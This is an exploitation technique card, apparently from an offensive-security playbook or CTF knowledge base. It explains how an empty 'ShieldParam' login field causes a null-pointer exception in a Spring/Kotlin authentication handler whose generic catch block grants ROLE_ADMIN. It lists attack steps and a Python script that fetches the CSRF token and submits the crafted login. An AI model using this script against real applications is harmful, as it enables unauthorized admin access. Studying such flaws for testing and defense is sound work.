---
name: spring_auth_handler_npe_role_escalation
vuln_type: auth_bypass
sub_technique: npe_role_escalation
category: exploitation
safety_level: safe
---

# Spring Authenticationsuccesshandler Npe Via Empty Json Input → Generic Exception Catch Grants Admin Role

## When to Apply

A Spring Security application has a custom `AuthenticationSuccessHandler` that parses a request parameter (e.g., `ShieldParam`) as JSON using Jackson `ObjectMapper().readTree()`. The handler has layered try-catch blocks: `JsonParseException` → adds ROLE_USER, generic `Exception` → adds ROLE_ADMIN. When the parameter is an empty string, `readTree("")` returns null in Jackson 2.x. Kotlin's non-null assertion (`!!`) on the null result throws a `KotlinNullPointerException` (or `NullPointerException`), which is NOT a `JsonParseException` but IS caught by the generic `Exception` handler, which mistakenly grants ROLE_ADMIN. This is conceptually related to CVE-2024-22234 (Spring Security auth bypass via NPE).

## Prerequisites

- Spring Security with custom AuthenticationSuccessHandler
- Handler parses a request parameter as JSON (Jackson ObjectMapper.readTree)
- Layered catch blocks: specific exception → normal role, generic Exception → elevated role
- Jackson readTree returns null for empty string input (Jackson 2.x behavior)
- Kotlin non-null assertion (!!) or equivalent null dereference triggers NPE
- NPE falls through specific catch to generic Exception catch that grants ROLE_ADMIN

## Steps

1. Register a normal user account via the signup form (with CSRF token)\n2. POST login with credentials + `ShieldParam=` (empty string):\n   - `ObjectMapper().readTree("")` → returns null\n   - `shieldParamNode!!` → throws NullPointerException\n   - `catch (JsonParseException)` → not matched\n   - `catch (Exception)` → matched → `ROLE_ADMIN` granted\n3. Session now has ROLE_ADMIN authority\n4. Access admin-only endpoints protected by `@EndPointManager` interceptor

## Code Template

```
import requests\nfrom bs4 import BeautifulSoup\nsession = requests.Session()\n# Get CSRF token\ncsrf_page = session.get(f'{URL}/user/login').text\ncsrf = BeautifulSoup(csrf_page, 'html.parser').find('input', {'name': '_csrf'})['value']\n# Login with empty ShieldParam → NPE → ROLE_ADMIN\nsession.post(f'{URL}/user/login', data={\n    '_csrf': csrf, 'username': USER, 'password': PASS, 'ShieldParam': ''\n})
```

## Examples

### Example 1

- **json_parser**: Jackson ObjectMapper().readTree("") returns null for empty string
- **npe_trigger**: Kotlin !! non-null assertion on null → KotlinNullPointerException
- **catch_hierarchy**: catch(JsonParseException) → ROLE_USER; catch(Exception) → ROLE_ADMIN
- **cve_reference**: Conceptually related to CVE-2024-22234 (Spring Security NPE auth bypass)

The root cause is a flawed exception handling hierarchy in the AuthenticationSuccessHandler. The developer intended JsonParseException to catch malformed JSON and grant normal user role, but NullPointerException from null JSON parsing result is a different exception type that falls through to the generic Exception handler. The generic handler was likely intended as a fallback for unexpected errors but mistakenly grants ROLE_ADMIN instead of denying access.
